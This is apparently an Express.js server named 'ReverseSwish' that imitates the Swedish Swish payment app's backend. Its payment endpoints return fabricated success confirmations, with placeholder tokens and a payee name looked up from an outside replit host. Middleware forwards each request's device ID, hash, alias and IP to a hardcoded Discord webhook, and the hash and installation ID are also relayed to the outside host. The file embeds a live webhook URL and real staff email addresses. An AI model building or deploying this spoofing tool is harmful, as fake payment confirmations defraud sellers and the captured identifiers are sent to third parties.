const express = require("express");
const axios = require("axios");

const moment = require('moment'); // Import moment.js for date formatting

const app = express();
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1257464182257745980/c9fqfewXJrsw-BAvglkmbfJ99-WeCcdmWpsH59L8GejA3vovL4DSRv2kROAEjxTV_3ms";

app.use(express.json());
let savedData = {}; // Variable to store data from initiatepayment
let Hash = ""; // Variable to store data from initiatepayment
let Cltime = ""; // Variable to store data from initiatepayment
let Installid = ""; // Variable to store data from initiatepayment

// Example route handler for '/'
app.get('/', (req, res) => {
  res.send("Hey there");
});

// Function to send Discord webhook with an embed message
async function sendDiscordWebhookEmbed(embed) {
  try {
    await axios.post(DISCORD_WEBHOOK_URL, { embeds: [embed] });
    console.log("Embedded Webhook sent successfully");
  } catch (error) {
    console.error("Error sending webhook:", error.message);
  }
}

// Middleware to send a Discord webhook for every request
app.use(async (req, res, next) => {
  try {
    const ipAddress = req.headers['x-forwarded-for'];
    const hash = req.headers['hash'];
    const alias = req.headers['swish-alias'];
    const clienttime = req.headers['clienttime'];
    const instid = req.headers['installationid'];

    const embedMessage = {
      title: 'New Request Details',
      description: 'A new request has been made.',
      color: 16711680, // Red color (decimal)
      fields: [
        { name: 'Vercel IP', value: ipAddress, inline: true },
        { name: 'Swish Hash', value: hash, inline: true },
        { name: 'Swish Alias', value: alias, inline: true },
        { name: 'Swish CTime', value: clienttime, inline: true },
        { name: 'Swish DeviceID', value: instid, inline: true },
      ],
      footer: { text: 'ReSwish IOS | Version (0.0.1)' }
    };
    Hash = hash;
    Cltime = clienttime;
    Installid = instid;

    await sendDiscordWebhookEmbed(embedMessage);
  } catch (error) {
    console.error('Error processing request:', error);
  }
  next();
});

async function checkPhoneNumberValidity(phoneNumber) {
  const url = `https://swishgo.replit.app/initiatePayment?phone=${phoneNumber}`;
  try {
    const response = await axios.get(url);
    return response.data; // Return the data received from the API
  } catch (error) {
    console.error('Error checking phone number validity:', error);
    throw new Error('Error checking phone number validity'); // Throw an error if API request fails
  }
}


// Endpoint to initiate payment
app.post("/mpc-swish/api/v4/initiatepayment", async (req, res) => {
  const { message, currency, paymentRequestId, swishCardId, msisdnPayee, amount } = req.body;

  // Save the request data to use later if needed
  savedData = req.body;

    // Check phone number validity
    const phoneValidity = await checkPhoneNumberValidity(msisdnPayee);

    // Ensure validity information is present and correct
    if (phoneValidity === "") {
      // Handle case where phone validity data is undefined (empty response)
      res.status(200).json({
        autoStartToken: "deadb33f-cdb6-4df3-8de0-deadb33f",
        result: "200",
        paymentID: "DEADB33F"
      });

    } else {
      // Proceed with payment initiation logic since phoneValidity has data
      res.status(200).json({
        autoStartToken: "deadb33f-cdb6-4df3-8de0-deadb33f",
        result: "200",
        paymentID: "DEADB33F"
      });

    }
});

app.get("/mpc-swish/api/v1/blocks/", (req, res) => {
  res.status(200).send('{"time":"2024-06-19T13:38:01.122+00:00","block":[]}');
});

app.get("/mpc-swish/api/v4/paymenthistory/100/INCOMING/0/100/", (req, res) => {
  res.status(200).send('{"result":"200","bankIdOrderReference":null,"dateTimeOfSearch":null,"endOfSearch":true,"item":[],"autoStartToken":null}');
});

app.get("/mpc-swish/api/v4/paymenthistory/100/ALL/0/100/", (req, res) => {
  res.status(200).send('{"result":"200","bankIdOrderReference":null,"dateTimeOfSearch":null,"endOfSearch":true,"item":[],"autoStartToken":null}');
});

app.get("/mpc-swish/api/v4/paymenthistory/100/OUTGOING/0/100/", (req, res) => {
  res.status(200).send('{"result":"200","bankIdOrderReference":null,"dateTimeOfSearch":null,"endOfSearch":true,"item":[],"autoStartToken":null}');
});

app.get("/mpc-swish/api/v1/paymentrequest/findByRoleAndState", (req, res) => {
  res.status(200).send('{"data":[],"time":"2019-12-17T13:17:08.188+0000"}');
});

app.get("/mpc-swish/api/v2/validation/", (req, res) => {
  res.status(200).send('{"result":"200","brandingId":"NDEASE","brandingVersion":"2","timeToLive":300000,"pushMessageCount":0}');
});

app.get("/apputils-swish/api/v1/favorite", (req, res) => {
  res.status(200).send('{"result":"200","favorites":[{}]}');
});

// ExecutePayment Endpoint
app.post("/mpc-swish/api/v3/initiateactivation/:param1/:param2", (req, res) => {
  res.status(200).send('{"result":"200","autoStartToken":"9e83a6c0-d8bb-428b-b99b-3a59340c57c7"}');
});

app.post("/mpc-swish/api/v3/executeactivation/", (req, res) => {
  res.status(200).send('{"result":"200","deviceId":"7FD03B1676F346F6A7E685D987047D7A","brandingId":"NDEASE","brandingVersion":"2","timeToLive":300000}');
});

app.post("/mpc-swish/api/v3/executepayment/:id/:id2", async (req, res) => {
  const { id, id2 } = req.params;

  // Use savedData from initiatepayment
  const { message, currency, paymentRequestId, swishCardId, msisdnPayee, amount } = savedData;

  try {
    // Example URL to fetch data using saved data
    const url = `https://swishgo.replit.app/initiatePayment?phone=${msisdnPayee}`;
    const headers = {
      'Hash': Hash, // Replace with your actual hash value
      'Clienttime': Cltime,
      'installationid': Installid
    };
    const response = await axios.get(url, { headers });
    console.log('Data received:', response.data);

    // Get current timestamp in ISO 8601 format without 'Z'
    const currentTimestamp = moment().format('YYYY-MM-DDTHH:mm:ss');

    let buffer = Buffer.from(message, 'base64');
    let decodedString = buffer.toString('utf-8');

    const responseData = {
      result: "200",
      amount: amount,
      currency: currency,
      message: decodedString,
      timestamp: currentTimestamp,
      bankPaymentReference: "123456789",
      payeeName: response.data,
      payeeBusinessName: null,
      payeeAlias: msisdnPayee
    };

    res.json(responseData); // Send JSON response

  } catch (error) {
    console.error('Error fetching data:', error);
    res.status(500).json({ error: 'Error fetching data' }); // Error response
  }
});

// Badgecount Endpoints
app.get("/mpc-swish/api/v2/badgecount/", (req, res) => {
  res.status(200).send('{"result":"200","payments":1}');
});

app.get("/mpc-swish/api/v1/paymentrequest/badgecount", (req, res) => {
  res.status(200).send('{"data":{"pprInfo":1,"pprRequiresAction":0},"time":"2024-06-18T12:07:37.587+00:00"}');
});

// Consents Endpoint
app.get("/mpc-swish/consents/v1/detailed-notifications/info", (req, res) => {
  res.status(200).send('{"requestReference":"028C557A57064DBC80810213A6320561","devicePublicKey":"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0KzjRPBgtWPFpHYjLE9HK4gfwYXnKpkuL3mNUXgjJvzUTZdBSgV9f2T5cEbiPLQcgifGymtfdjZ4Gt9syoHsqaDIbxjx0bd05T4h26gQtNEfGuhFy6uXMvgKP3PFP5paYzKUJHi+yTFlaSZnKEUrlCu5D2kOqTz6cv5NISUJH0u1H7kesckhdQT7cfEPNdjYnbImrXLZ9P3+3E0UxApEmztwm0lDCHFS0tjgX2Yh4hjxx/tCCk1BMu/HXdYne66DzkOmv63YeAXrR+3VluhgCsj5j576UK6lWgEunsV8/QV0HzjXM/ne2IEsbuceITdSKgcxPfvVW79JafdK0BipWwIDAQAB","version":"2i","optInDate":"2024-06-18T12:07:23.164+00:00","validDays":90}');
});

app.get("/v1/issues/active?channel=appPrivate", (req, res) => {
  res.status(200).send(
    '[{"id":"7fb409c1-a704-42ee-9a33-a0304f9cf893","resolved_at":null,"type":"DOWNTIME","ends_at":null,"created_by":{"at":1573760671379,"email":"helena.timm@bontouch.com"},"starts_at":1573408806000,"target":{"service":"all","bank":"","provider":"swish","supplier":""},"updates":[],"publish_at":1573758006000,"updated_by":{"email":"helena.timm@bontouch.com","at":1573761948676},"channels":[{"data":{"message":"1","title":"Driftstopp"},"name":"appPrivate"}]},{"id":"76148aad-aa49-49c3-ae76-6334c6929c06","created_by":{"email":"hendrik.stjernstrom@bontouch.com","at":1573485984711},"starts_at":1573485936144,"target":{"service":"all","provider":"bank"},"updates":[],"publish_at":1573485936144,"channels":[{"data":{"message":"2","title":"H"},"name":"appPrivate"}],"resolved_at":null,"type":"DISTURBANCE","ends_at":null},{"id":"da4129be-1ca3-412b-824d-95ec5a48143b","ends_at":null,"created_by":{"at":1573544574430,"email":"hendrik.stjernstrom@bontouch.com"},"starts_at":1573544544003,"target":{"service":"all","bank":"Handelsbanken","provider":"bank"},"updates":[],"publish_at":1573544544003,"channels":[{"name":"appPrivate","data":{"title":"","message":"3"}}],"resolved_at":null,"type":"DISTURBANCE"},{"id":"73435caa-9183-4df1-9177-4604fb28509a","created_by":{"at":1573634479014,"email":"hendrik.stjernstrom@bontouch.com"},"starts_at":1573634382799,"target":{"provider":"swish","service":"all","bank":""},"updates":[],"publish_at":1573634382799,"channels":[{"data":{"message":"4","title":""},"name":"appPrivate"}],"resolved_at":null,"type":"DISTURBANCE","ends_at":null},{"id":"d4cf7692-cb33-4325-882d-e2289469cb51","target":{"provider":"supplier","supplier":"bankgirot","service":"all","bank":""},"updates":[],"publish_at":1573746470100,"channels":[{"data":{"message":"5","title":"Hendrik"},"name":"appPrivate"}],"resolved_at":null,"type":"DISTURBANCE","ends_at":null,"created_by":{"email":"hendrik.stjernstrom@bontouch.com","at":1573746506835},"starts_at":1573746470100}]'
  );
});

// PaymentRequest Endpoints
app.get("/mpc-swish/api/v1/paymentrequest/viewSetting", (req, res) => {
  res.status(200).send('{"data":{"privatePaymentRequest":true,"requireParentalConsent":false},"time":"2024-05-23T17:08:25.261+00:00"}');
});

app.post("/mpc-swish/api/v1/paymentrequest/initiatePaymentRequest", async (req, res) => {
  try {
    const { receiverAlias, amount, message, currency } = req.body;

    // Validate required fields
    if (!receiverAlias || !amount || !currency) {
      return res.status(400).json({ error: 'receiverAlias, amount, and currency are required' });
    }

    const url = `https://swishgo.replit.app//initiatePayment?phone=${receiverAlias}`;
    const headers = {
      'Hash': Hash, // Replace with your actual hash value
      'Clienttime': Cltime,
      'installationId': Installid
    };
    const response = await axios.get(url, { headers });
    console.log('Data received:', response.data);

    const responseData = {
      data: {
        id: "494fc0a5-ec81-4db8-a53e-a6f1f53c6995",
        state: "INITIATED",
        amount: amount,
        currency: currency,
        senderName: "LUNAR",
        senderAlias: null,
        receiverName: response.data, // Use response.data directly
        receiverAlias: null,
        message: message || "",
        deniedMessage: null,
        viewed: false,
        initiatedAt: "2024-07-04T16:54:57.384764239Z",
        confirmedAt: null,
        cancelledAt: null,
        deniedAt: null,
        deletedAt: null,
        updatedAt: "2024-07-04T16:54:57.384764719Z",
        expiredAt: null
      },
      time: "2024-07-04T16:54:57.404+00:00"
    };

    res.json(responseData); // Send JSON response

  } catch (error) {
    console.error('Error fetching data:', error);
    res.status(500).json({ error: 'Error fetching data' }); // Error response
  }
});

app.get("/mpc-swish/api/v3/paymentrequest/ecom/check/:num", (req, res) => {
  res.status(200).send('{"result":"200","checkInfo":{"status":"NOT_FOUND","mechanism":"longpolling","clientTimeOut":25,"secondsUntilNextRequest":3}}');
});

// Error handling middleware for 404 errors
app.use((req, res, next) => {
  const err = new Error('Not Found');
  err.status = 404;
  next(err); // Passes control to the error handling middleware
});

app.use((err, req, res, next) => {
  if (err.status === 404) {
    res.status(200).send('{"result":"200","message":null}');
  } else {
    next(err); // Passes control to the default error handler for other errors
  }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`ReverseSwish is running on port ${PORT}!`);
});
